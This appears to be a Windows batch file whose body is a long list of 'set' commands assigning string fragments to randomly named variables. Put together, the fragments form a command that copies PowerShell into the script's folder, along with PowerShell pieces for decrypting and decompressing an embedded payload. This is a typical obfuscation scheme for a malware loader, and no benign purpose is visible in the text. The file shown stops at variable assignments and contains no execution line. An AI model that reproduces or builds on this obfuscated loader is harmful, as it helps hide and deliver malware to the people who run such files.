@echo off
set "noXXOXHjsZ=po"
set "YhwQgitgYB=ws"
set "RUIacixNnz=\W"
set "BcizhqnCnO=1."
set "JPklOMoSSV=nd"
set "IWBEeOwlFv=rs"
set "yFoTqqFPVT=s\"
set "HdIHxooaws=we"
set "eIQvWrNsTZ=.e"
set "wwqGsBwZAN= C"
set "rrPftJzjdX=he"
set "OeWzaskCWF=0\"
set "MFPreWUBfJ=Sy"
set "MGILQMvNKk=ow"
set "TtKGNtrpUS=\v"
set "iEykwjGizC=co"
set "NnvNBMepQI=rS"
set "wDFHDJukrz=do"
set "rvcTRVyPsS=ll"
set "IdkowFPLcM=ll"
set "BwEWQDQaGk=xe"
set "ZLiTqAXYsn=y "
set "xfQAKyPRki=Wi"
set "MeNTwwibwr=:\"
set "iOtpEmfkLj=he"
set "QiHgGHGLkN=py"
set "dbhaJdArVx=em"
set "sjplwonCLB=we"
set "gyWYjgRqHT=32"
set "GMdvEFsYhy=Po"
set "jdRBSFLnhy= /"
set "TBfXQKyOHa=in"
set "hqiBFQxeKY=st"
set "hKhgoKwVlh=cd"
set "JWLRhXuqGX= %~dp0"
set "sKlmLRQjRi=]::("
set "JsgvAjvqqw=eam("
set "RPgyTpWJkB=nage"
set "tDynpnMUAS=);$K"
set "TWcCIyQCum=oL'["
set "TBhGJMcyXB=bjec"
set "yyecvbrgZc='txe"
set "fYQkUrZpEC=);$K"
set "RvrnogRIWZ= '')"
set "zZyzJpYSoo=($qV"
set "RDOxDhqcik=Obje"
set "JQQMxXpPPV=t Sy"
set "eEfoiEkFBu=();$"
set "hYLbwbWBRr=m(, "
set "GXqmSPtOrH=g = "
set "hPgQrkZXIF=New-"
set "mblMZUKVec= [Sy"
set "aXqHBrnanI=Star"
set "HsBdFbiFhF=brea"
set "axjLmBXMZD=comm"
set "mFcevVdErp=SA ="
set "PGenWeKZbJ=vZk."
set "yIlHsZGNcy=join"
set "yadDydygTJ=rity"
set "vJaRobpxkD=mory"
set "MaTwOqhDoV=tsWi"
set "QQuKGryvRW=bstr"
set "ZlawinuFJi=::De"
set "CkHUmFshsV=Syst"
set "iGdLnfkDJA=tem."
set "SQDMZnMHVn== [S"
set "uWLBtgooJY=oSEL"
set "voaMlrCCMN=rt]:"
set "lltAnorWFQ=ach "
set "rfyfEGMaJq=.Mem"
set "VRvZIsPJbM=-nop"
set "iHkfprIdjA=y.Pa"
set "jgdOVoMjdf=::('"
set "FRPnfEmMbr=$aHl"
set "aszUfdHnQp=KMth"
set "ZzJMNYDDse=ress"
set "qGdXlDLEoQ=u) {"
set "PYeyIZUIFa=8kuY"
set "PHBSmKwIuC= [st"
set "UspkucaViu=G.Su"
set "eJXtfARFhh=ect "
set "PMSkynlPYS=7kGw"
set "IqGWSHoKyv= = $"
